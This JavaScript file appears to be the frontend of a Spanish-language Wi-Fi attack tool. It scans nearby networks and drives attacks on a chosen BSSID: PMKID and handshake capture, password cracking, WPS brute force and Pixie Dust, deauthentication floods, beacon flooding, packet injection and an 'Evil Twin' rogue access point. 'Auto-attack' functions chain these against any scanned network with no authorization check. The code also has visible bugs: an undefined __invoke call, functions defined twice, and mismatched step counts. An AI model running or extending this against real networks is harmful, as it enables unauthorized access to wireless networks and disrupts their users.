import { invoke } from '@tauri-apps/api/core';

// ── State ────────────────────────────────────────────────────────────────
let activeTab = 'scan';
let logLines  = [];

// ── helpers ──────────────────────────────────────────────────────────────
const $  = id => document.getElementById(id);
const esc = s => String(s)
  .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');

function el(tag, cls, html) {
  const e = document.createElement(tag);
  if (cls) e.className = cls;
  if (html !== undefined) e.innerHTML = html;
  return e;
}

// ── Log ──────────────────────────────────────────────────────────────────
function log(msg, level = 'info') {
  const now = new Date().toLocaleTimeString('es-ES', { hour12: false });
  const line = `[${now}] [${level.toUpperCase()}] ${msg}`;
  logLines.push(line);
  const cv = $('cv');
  if (cv) {
    cv.textContent += logLines.length === 1 ? line : '\n' + line;
    cv.scrollTop = cv.scrollHeight;
  }
  console.log(line);
}

function clearConsole() {
  logLines = [];
  $('cv').textContent = '';
}

// ── Tabs ─────────────────────────────────────────────────────────────────
window.showTab = function (id) {
  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active'));
  $(`tab-${id}`)?.classList.add('active');
  $(`nav-${id}`)?.classList.add('active');
  activeTab = id;
};

// ── Render rows ───────────────────────────────────────────────────────────
function sigChars(sig) {
  const c = Math.max(0, Math.min(100, sig));
  return c >= 75 ? '▂▄▆█'
       : c >= 50 ? '▂▄▆'
       : c >= 25 ? '▂▄'
       : '▁';
}

function sigColor(sig) {
  const c = Math.max(0, Math.min(100, sig));
  return c >= 60 ? 'var(--green)' : c >= 35 ? 'var(--yellow)' : 'var(--red)';
}

function secColor(sec) {
  if (!sec || /abierta|open/i.test(sec)) return 'var(--gray)';
  return 'var(--accent)';
}

function rowsHtml(nets) {
  if (!nets.length) {
    return `
      <tr class="empty-row">
        <td colspan="6">
          <div class="empty-state">
            <span class="ei">&#128247;</span>
            <p>No se encontraron redes en este escaneo.</p>
          </div>
        </td>
      </tr>`;
  }

  return nets.map(n => `
    <tr>
      <td class="td-bar" style="color:${sigColor(n.signal)}">${sigChars(n.signal)}</td>
      <td class="td-ssid" title="${esc(n.ssid)}">${esc(n.ssid)}</td>
      <td class="td-num" style="color:${sigColor(n.signal)};text-align:right">${n.signal}%</td>
      <td class="td-num" style="color:var(--muted);text-align:right">${n.channel ?? '–'}</td>
      <td><span class="sec-badge"
               style="background:${secColor(n.security)}22;color:${secColor(n.security)};
                      border:1px solid ${secColor(n.security)}55;padding:3px 10px;
                      border-radius:99px;font-size:11px;font-weight:600">
              ${esc(n.security || 'Abierta')}
            </span></td>
      <td class="td-bssid">${esc(n.bssid || '—')}</td>
    </tr>
  `).join('');
}

// ── Scan handler ──────────────────────────────────────────────────────────
window.doScan = async function () {
  const btn = $('scanBtn');
  btn.disabled = true;
  btn.textContent = 'Escaneando…';
  $('status-txt').textContent = 'Escaneando…';
  $('count-pill').style.display = 'none';
  log('Comando scan_wifi enviado al proceso Rust…', 'info');

  const t0 = performance.now();

  try {
    const result = await __invoke('scan_wifi');
    const ms = Math.round(performance.now() - t0);

    if (result?.error) {
      log(`ERROR: ${result.error}`, 'error');
      renderHeader(`Error · ${result.error}`);
      renderRows([]);
      $('status-txt').textContent = 'Error';
      return;
    }

    const nets = result?.networks || [];
    lastNets = [...nets];   // guarda para el panel de ataque
    syncTargetList();       // refresca el selector BSSID
    log(`Escaneo completado en ${ms} ms · ${nets.length} redes encontradas`, 'info');
    renderHeader(`${ms} ms · ${nets.length} red${nets.length === 1 ? '' : 'es'} encontrada${nets.length === 1 ? '' : 's'}`);
    renderRows(nets);
    $('status-txt').textContent = 'Listo';
    $('count-pill').style.display = 'inline';
  } catch (err) {
    const msg = String(err);
    log(`FATAL: ${msg}`, 'error');
    renderHeader('Error de conexión');
    renderRows([]);
  } finally {
    btn.disabled = false;
    btn.textContent = '&#8635; Escanear ahora';
  }
};

function renderHeader(text) {
  let pill = $('count-pill');
  if (!pill) return;
  pill.textContent = text;
  pill.style.display = 'inline';
}

function renderRows(nets) {
  $('net-tbody').innerHTML = rowsHtml(nets);
}

// ── Attack helpers: state & select ──────────────────────────────────────────
let lastNets = []; // last scan result — feeds attack BSSID dropdown

window.syncTargetList = function () {
  const sel = $('attack-bssid');
  if (!sel) return;
  sel.innerHTML = '<option value="">-- Selecciona una red de la lista --</option>';
  lastNets.forEach(n => {
    const opt   = document.createElement('option');
    opt.value   = n.bssid || '';
    opt.textContent = `${n.ssid}  ·  ${n.bssid || 'sin bssid'}  ·  ${n.security}`;
    sel.appendChild(opt);
  });
};

function getSelectedBssid() {
  const bssid = $('attack-bssid')?.value?.trim();
  if (!bssid) { log('Selecciona un objetivo BSSID en el panel Ataque primero.', 'warn'); return null; }
  return bssid;
}

function valOrEmpty(v) { return String(v ?? '').trim(); }

// ── Attack invocations ──────────────────────────────────────────────────────
window.capturePmkid = async function () {
  const bssid = getSelectedBssid(); if (!bssid) return;
  const chRaw = valOrEmpty($('pmkid-chan').value);
  const ch    = chRaw ? parseInt(chRaw) : undefined;
  const dur   = $('pmkid-dur').value ? parseInt($('pmkid-dur').value) : 120;
  currentAttackId = `pmkid_${bssid.replace(/:/g,'')}`;
  return invokeAttack('pmkid_capture_bg', { bssid, channel: ch, duration_seconds: dur });
};

window.convertPmkid = async function () {
  const pcap = valOrEmpty($('convert-pcap').value);
  if (!pcap) { log('Especifica el archivo .pcapng a convertir.', 'warn'); return; }
  return invokeAttack('pmkid_convert', { pcapng_path: pcap, output_dir: undefined });
};

window.crackPmkid = async function () {
  const hash = valOrEmpty($('crack-hash').value);
  const wl   = valOrEmpty($('crack-wordlist').value);
  if (!hash) { log('Especifica el archivo .22000 a crackear.', 'warn'); return; }
  return invokeAttack('pmkid_crack', {
    hash_file: hash,
    wordlist:  wl || undefined,
    attack_mode: undefined,
  });
};

window.wpsBrute = async function () {
  const bssid = getSelectedBssid(); if (!bssid) return;
  const iface = valOrEmpty($('wps-iface').value) || 'wlan0';
  currentAttackId = `wps_${bssid.replace(/:/g,'')}`;
  return invokeAttack('wps_pin_bruteforce_bg', { bssid, interface: iface });
};

window.captureHandshake = async function () {
  const bssid = getSelectedBssid(); if (!bssid) return;
  const essid = valOrEmpty($('handshake-essid').value) || undefined;
  const chRaw = valOrEmpty($('handshake-chan').value);
  const ch    = chRaw ? parseInt(chRaw) : undefined;
  const dur   = $('handshake-dur').value ? parseInt($('handshake-dur').value) : 60;
  currentAttackId = `handshake_${bssid.replace(/:/g,'')}`;
  return invokeAttack('capture_handshake_bg', { bssid, essid, channel: ch, duration_seconds: dur });
};

window.crackHandshake = async function () {
  const hash  = valOrEmpty($('crack-handshake-hash').value);
  const wl    = valOrEmpty($('crack-handshake-wordlist').value);
  const atk   = valOrEmpty($('crack-handshake-mode').value) || '0';
  const sess  = valOrEmpty($('crack-handshake-session').value) || undefined;
  if (!hash) { log('Especifica el archivo .hccapx o .22000 a crackear.', 'warn'); return; }
  return invokeAttack('crack_handshake', {
    hash_file: hash,
    wordlist:  wl || undefined,
    attack_mode: parseInt(atk) || undefined,
    session_name: sess || undefined,
  });
};

window.doDeauth = async function () {
  const bssid  = valOrEmpty($('deauth-bssid').value);
  const client = valOrEmpty($('deauth-client').value) || undefined;
  const cnt    = valOrEmpty($('deauth-count').value) || '10';
  const iface  = valOrEmpty($('deauth-iface').value) || 'wlan0mon';

  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`Deauth: AP=${bssid} client=${client || 'broadcast'} cnt=${cnt} iface=${iface}`, 'warn');
  return invokeAttack('deauth_inject', { bssid, client_mac: client, count: parseInt(cnt) || 10, interface: iface });
};

window.doDisassoc = async function () {
  const bssid  = valOrEmpty($('deauth-bssid').value);
  const client = valOrEmpty($('deauth-client').value) || undefined;
  const cnt    = valOrEmpty($('deauth-count').value) || '5';
  const iface  = valOrEmpty($('deauth-iface').value) || 'wlan0mon';

  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`Disassoc: AP=${bssid} client=${client || 'broadcast'} cnt=${cnt} iface=${iface}`, 'warn');
  return invokeAttack('disassoc_inject', { bssid, client_mac: client, count: parseInt(cnt) || 5, interface: iface });
};

window.doBeaconFlood = async function () {
  const essid = valOrEmpty($('beacon-essid').value);
  const ch    = valOrEmpty($('beacon-chan').value) || '1';
  const cnt   = valOrEmpty($('beacon-count').value) || '50';
  if (!essid) { log('Especifica un ESSID para el beacon flood.', 'warn'); return; }
  log(`Beacon flood: ESSID=${essid} chan=${ch} beacons=${cnt}`, 'warn');
  return invokeAttack('beacon_flood', { essid, bssid: undefined, channel: parseInt(ch) || 1, beacon_count: parseInt(cnt) || 50 });
};

window.doAirodumpScan = async function () {
  const chRaw   = valOrEmpty($('airodump-chan').value);
  const ch      = chRaw ? parseInt(chRaw) : 0;
  const dur     = valOrEmpty($('airodump-dur').value) ? parseInt($('airodump-dur').value) : 60;
  const bssid   = valOrEmpty($('airodump-bssid').value) || undefined;
  currentAttackId = 'airodump_scan';
  log(`airodump: ch=${ch || 'todos'} dur=${dur}s bssid=${bssid || 'ninguno'}`, 'info');
  return invokeAttack('scan_airodump_bg', { bssid_filter: bssid, channel_filter: ch || undefined, duration_secs: dur });
};

window.doArpreply = async function () {
  const bssid = valOrEmpty($('arpreply-bssid').value);
  const mac   = valOrEmpty($('arpreply-mac').value) || 'ff:ff:ff:ff:ff:ff';
  const iface = valOrEmpty($('arpreply-iface').value) || 'wlan0mon';
  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`ARP Replay: AP=${bssid} mac=${mac} iface=${iface}`, 'warn');
  return invokeAttack('arp_replay_inject', { target_bssid: bssid, address: mac, iface });
};

window.doWpsPbc = async function () {
  const bssid = valOrEmpty($('wpspbc-bssid').value);
  const iface = valOrEmpty($('wpspbc-iface').value) || 'wlan0';
  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`WPS PBC: BSSID=${bssid} iface=${iface}`, 'warn');
  return invokeAttack('wps_pbc_attack', { bssid, iface });
};

window.doChopChop = async function () {
  const bssid    = valOrEmpty($('chopchop-bssid').value);
  const srcMac   = valOrEmpty($('chopchop-mac').value) || undefined;
  const iface    = valOrEmpty($('chopchop-iface').value) || 'wlan0mon';
  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`ChopChop: AP=${bssid} src=${srcMac || '00:11:22:33:44:55'} iface=${iface}`, 'warn');
  return invokeAttack('chopchop_inject', { target_bssid: bssid, source_mac: srcMac, iface });
};

window.doRogueAp = async function () {
  const essid  = valOrEmpty($('rogue-essid').value);
  const bssid  = valOrEmpty($('rogue-bssid').value) || undefined;
  const ch     = valOrEmpty($('rogue-chan').value) || '1';
  const iface  = valOrEmpty($('rogue-iface').value) || 'wlan0mon';
  if (!essid) { log('Especifica el ESSID del AP falso.', 'warn'); return; }
  log(`Evil Twin: ESSID=${essid} BSSID=${bssid || '00:11:22:33:44:55'} chan=${ch} iface=${iface}`, 'warn');
  return invokeAttack('rogue_ap', { essid, bssid, channel: parseInt(ch) || 1, iface });
};

// Wrapper usado por los botones onclick="doCmd('name', handler)"
window.doCmd = function (cmdName, handler) {
  log(`>>> [${cmdName}] ejecutando…`, 'info');
  return handler();
};

async function invokeAttack(cmd, args) {
  log(`>>> Rust invoke → ${cmd}  args=${JSON.stringify(args)}`, 'info');
  const t0 = performance.now();
  try {
    const result = await __invoke(cmd, args);
    const ms   = Math.round(performance.now() - t0);
    // Handle Result<CmdResponse, String> (background commands)
    if (result && typeof result === 'object' && 'ok' in result === false && 'success' in result) {
      // Old style CmdResponse
      const out  = result?.output || '';
      if (result?.stderr) log(`[${cmd}]:\n${result.stderr}`, 'warn');
      if (out) {
        const lines = out.split('\n');
        const head  = lines.slice(0, 80).join('\n');
        if (lines.length > 80) {
          log(`[${cmd}] — ${lines.length} líneas de salida. Primeras 80:\n${head}\n...`, 'output');
        } else {
          log(`[${cmd}]:\n${out}`, 'output');
        }
      }
      if (result?.success) {
        log(`✅ ${cmd} completado en ${ms} ms`, 'ok');
      } else {
        log(`⚠️  ${cmd} finalizó (code=${result?.exit_code ?? '?'}) en ${ms} ms`, 'warn');
      }
    } else {
      // New Result style: Ok or Err
      if (result?.ok === false && result?.err) {
        log(`[ERROR ${cmd}] ${result.err}`, 'error');
      } else if (result?.ok === true) {
        log(`✅ ${cmd} completado en ${ms} ms`, 'ok');
      }
    }
  } catch (err) {
    log(`[FATAL ${cmd}] ${err}`, 'error');
  }
}

// ── Tools detection ─────────────────────────────────────────────────────────
window.checkToolsStatus = async function () {
  const body = $('tools-status-body');
  if (!body) return;
  body.innerHTML = '<p style="font-size:11.5px;color:var(--muted)">Escaneando binarios…</p>';

  try {
    const result = await __invoke('detect_tools');
    const tools = result?.tools || [];
    const ready = result?.ready_count || 0;
    const total  = result?.total || tools.length;

    if (tools.length === 0) {
      body.innerHTML = '<p style="font-size:11.5px;color:var(--red)">No se pudo consultar el estado de herramientas.</p>';
      return;
    }

    let html = '';
    for (const t of tools) {
      const dotClass = t.found ? 'ok' : 'miss';
      const name     = t.found ? t.name : `${t.name}`;
      const path     = t.found ? t.full_path : t.install_hint || 'no encontrado';
      const ver      = t.version;
      html += `<div class="tool-row">
        <span class="tool-dot ${dotClass}"></span>
        <span class="tool-name">${esc(t.name)}</span>
        <span class="tool-path" title="${esc(path)}">${esc(path)}</span>
        <span class="tool-ver">${esc(ver)}</span>
      </div>`;
    }

    const summary = `<p style="font-size:11px;color:${ready === total ? 'var(--green)' : 'var(--orange)'};margin-top:4px">
      ${ready}/${total} herramientas listas ${ready === total ? '✅' : '⚠️ algunas faltan'}
    </p>`;

    body.innerHTML = html + summary;
    log(`Detectadas ${ready}/${total} herramientas listas.${ready < total ? ' Instala las faltantes con los hints mostrados.' : ''}`, ready < total ? 'warn' : 'ok');
  } catch (err) {
    body.innerHTML = `<p style="font-size:11.5px;color:var(--red)">Error consultando herramientas: ${esc(err)}</p>`;
    log(`[detect_tools] ERROR: ${err}`, 'error');
  }
};

window.findTool = async function (name) {
  if (!name) return;
  log(`>>> Buscando herramienta: ${name}`, 'info');
  try {
    const result = await __invoke('find_tool_cmd', { name });
    log(result.success ? `✅ ${result.output}` : `❌ ${result.output}`, result.success ? 'ok' : 'error');
  } catch (err) {
    log(`[find_tool] FATAL: ${err}`, 'error');
  }
};

// ── Init ─────────────────────────────────────────────────────────────────────
showTab('scan');

// Auto-scan con manejo de errores - no bloquea el inicio
setTimeout(async () => {
    try {
        await doScan();
    } catch (e) {
        console.error('Auto-scan falló:', e);
    }
}, 600);// AUTO-ATTACK MAESTRO
// Ejecuta todos los ataques disponibles en secuencia contra un objetivo

window.autoAttack = async function () {
  const bssid = getSelectedBssid();
  if (!bssid) return;

  log('========================================', 'warn');
  log('  AUTO-ATTACK: Secuencia completa', 'warn');
  log('  Objetivo: ' + bssid, 'warn');
  log('========================================', 'warn');

  const steps = [
    { name: '1/5 - PMKID Capture', cmd: 'pmkid_capture', args: { bssid, channel: undefined, duration_seconds: 60 } },
    { name: '2/5 - Handshake Capture', cmd: 'capture_handshake', args: { bssid, essid: undefined, channel: undefined, duration_seconds: 120 } },
    { name: '3/5 - WPS Pixie Dust', cmd: 'wps_pixiedust', args: { bssid, iface: undefined } },
    { name: '4/5 - WPS PIN Bruteforce', cmd: 'wps_pin_bruteforce', args: { bssid, interface: 'wlan0' } },
    { name: '5/5 - Deauth + Disassoc', cmd: 'deauth_inject', args: { bssid, client_mac: undefined, count: 5, interface: undefined } },
  ];

  for (const step of steps) {
    const btn = document.getElementById('autoAttackBtn');
    if (btn) btn.textContent = step.name;
    log('[' + (steps.indexOf(step)+1) + '/' + steps.length + '] ' + step.name + '...', 'warn');
    await invokeAttack(step.cmd, step.args);
  }

  log('========================================', 'ok');
  log('  AUTO-ATTACK COMPLETADO', 'ok');
  log('========================================', 'ok');
  const btn2 = document.getElementById('autoAttackBtn');
  if (btn2) btn2.textContent = 'Auto-Attack';
};


// QUICK ATTACK - ataque rapido directo
window.quickAttack = function (type) {
  const bssid = getSelectedBssid();
  if (!bssid) return;
  if (type === 'pmkid') {
    log('Quick attack: PMKID capture en ' + bssid, 'warn');
    return invokeAttack('pmkid_capture', { bssid, channel: undefined, duration_seconds: 60 });
  }
  if (type === 'deauth') {
    log('Quick attack: Deauth en ' + bssid, 'warn');
    return invokeAttack('deauth_inject', { bssid, client_mac: undefined, count: 5, interface: undefined });
  }
};

// Clear selection
window.clearSelection = function () {
  const sel = document.getElementById('attack-bssid');
  if (sel) sel.value = '';
  const auto = document.getElementById('auto-bssid');
  if (auto) auto.value = '';
  log('Seleccion limpiada', 'info');
};

// WPS Pixie Dust
window.doWpsPixieDust = async function () {
  const bssid = valOrEmpty(document.getElementById('pixie-bssid').value);
  const iface = valOrEmpty(document.getElementById('pixie-iface').value) || undefined;
  if (!bssid) { log('Especifica el BSSID del AP.', 'warn'); return; }
  return invokeAttack('wps_pixiedust', { bssid, iface });
};

// Fragment Injection
window.doFragment = async function () {
  const bssid = valOrEmpty(document.getElementById('frag-bssid').value);
  const iface = valOrEmpty(document.getElementById('frag-iface').value) || undefined;
  if (!bssid) { log('Especifica el BSSID del AP.', 'warn'); return; }
  return invokeAttack('fragment_inject', { bssid, iface });
};

// Cafe Latte
window.doCafeLatte = async function () {
  const bssid = valOrEmpty(document.getElementById('latte-bssid').value);
  const mac   = valOrEmpty(document.getElementById('latte-mac').value);
  const iface = valOrEmpty(document.getElementById('latte-iface').value) || undefined;
  if (!bssid || !mac) { log('Especifica BSSID y MAC del cliente.', 'warn'); return; }
  return invokeAttack('cafe_latte_attack', { bssid, client_mac: mac, iface });
};

// Interactive Inject
window.doInteractive = async function () {
  const iface = valOrEmpty(document.getElementById('interactive-iface').value) || undefined;
  return invokeAttack('interactive_inject', { iface });
};

// Auto-attack maestro 8 pasos
window.startAutoAttack = async function () {
  const bssid = getSelectedBssid();
  if (!bssid) return;
  const wordlist = valOrEmpty(document.getElementById('auto-wordlist').value) || undefined;
  const iface    = valOrEmpty(document.getElementById('auto-iface').value) || undefined;

  log('==============================', 'warn');
  log(' AUTO-ATTACK 8 PASOS INICIADO', 'warn');
  log(' Objetivo: ' + bssid, 'warn');
  log(' Wordlist: ' + (wordlist || 'por defecto'), 'warn');
  log('==============================', 'warn');

  const steps = [
    { n: '1/9 - Deauth ligero', cmd: 'deauth_inject', args: { bssid, client_mac: undefined, count: 3, interface: iface } },
    { n: '2/9 - Capturar PMKID', cmd: 'pmkid_capture', args: { bssid, channel: undefined, duration_seconds: 60 } },
    { n: '3/9 - Deauth fuerte', cmd: 'deauth_inject', args: { bssid, client_mac: undefined, count: 10, interface: iface } },
    { n: '4/9 - Capturar Handshake', cmd: 'capture_handshake', args: { bssid, essid: undefined, channel: undefined, duration_seconds: 120 } },
    { n: '5/9 - WPS Pixie Dust', cmd: 'wps_pixiedust', args: { bssid, iface } },
    { n: '6/9 - WPS PIN Bruteforce', cmd: 'wps_pin_bruteforce', args: { bssid, interface: iface || 'wlan0' } },
    { n: '7/9 - WPS PBC Attack', cmd: 'wps_pbc_attack', args: { bssid, iface } },
    { n: '8/9 - Beacon Flood', cmd: 'beacon_flood', args: { essid: 'TEST', bssid, channel: 1, beacon_count: 20 } },
    { n: '9/9 - Rogue AP', cmd: 'rogue_ap', args: { essid: 'TEST_FREE_WIFI', bssid, channel: 1, iface } },
  ];

  for (const step of steps) {
    const btn = document.getElementById('autoAttackBtn');
    if (btn) btn.textContent = step.n;
    log('[' + step.n + ']...', 'warn');
    await invokeAttack(step.cmd, step.args);
  }

  log('==============================', 'ok');
  log(' AUTO-ATTACK COMPLETADO', 'ok');
  log('==============================', 'ok');
  const btn2 = document.getElementById('autoAttackBtn');
  if (btn2) btn2.textContent = 'Auto-Ataque';
};


// ── Background attack state ──────────────────────────────────────────────
let currentAttackId = null;

window.cancelCurrentAttack = async function () {
  if (!currentAttackId) {
    log('No hay ataque en ejecución para cancelar.', 'warn');
    return;
  }
  const id = currentAttackId;
  log(`Cancelando ataque '${id}'…`, 'warn');
  try {
    const result = await __invoke('cancel_attack', { attackId: id });
    log(result.success ? `✅ ${result.output}` : `⚠️ ${result.output}`, result.success ? 'ok' : 'warn');
  } catch (err) {
    log(`Error al cancelar: ${err}`, 'error');
  }
};

window.injectionTest = async function () {
  const iface = valOrEmpty($('injtest-iface').value) || '';
  log(`>>> Injection test en ${iface || '(interfaz requerida)'}…`, 'info');
  return invokeAttack('injection_test', { iface: iface || undefined });
};

window.doFakeauth = async function () {
  const bssid = valOrEmpty($('fakeauth-bssid').value);
  const mac   = valOrEmpty($('fakeauth-mac').value) || undefined;
  const iface = valOrEmpty($('fakeauth-iface').value) || '';
  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`Fakeauth: AP=${bssid} mac=${mac || '00:11:22:33:44:55'} iface=${iface || '(requerida)'}`, 'warn');
  return invokeAttack('fakeauth_inject', { bssid, source_mac: mac, iface });
};

window.doWpsPixieDust = async function () {
  const bssid = valOrEmpty($('pixie-bssid').value);
  const iface = valOrEmpty($('pixie-iface').value) || '';
  if (!bssid) { log('Especifica el BSSID del AP objetivo.', 'warn'); return; }
  log(`WPS Pixie Dust: BSSID=${bssid} iface=${iface || '(requerida)'}`, 'warn');
  return invokeAttack('wps_pixiedust', { bssid, iface });
};

window.doCafeLatte = async function () {
  const bssid = valOrEmpty($('latte-bssid').value);
  const mac = valOrEmpty($('latte-mac').value);
  const iface = valOrEmpty($('latte-iface').value) || '';
  if (!bssid || !mac) { log('BSSID y MAC cliente son requeridos.', 'warn'); return; }
  log(`Café Latte: AP=${bssid} cliente=${mac} iface=${iface || '(requerida)'}`, 'warn');
  return invokeAttack('cafe_latte_attack', { bssid, client_mac: mac, iface });
};

window.doInteractive = async function () {
  const iface = valOrEmpty($('inter-iface').value) || '';
  log(`Interactive: iface=${iface || '(requerida)'}`, 'warn');
  return invokeAttack('interactive_inject', { iface });
};

window.doFragment = async function () {
  const bssid = valOrEmpty($('frag-bssid').value);
  const iface = valOrEmpty($('frag-iface').value) || '';
  if (!bssid) { log('BSSID es requerido.', 'warn'); return; }
  log(`Fragment: BSSID=${bssid} iface=${iface || '(requerida)'}`, 'warn');
  return invokeAttack('fragment_inject', { bssid, iface });
};
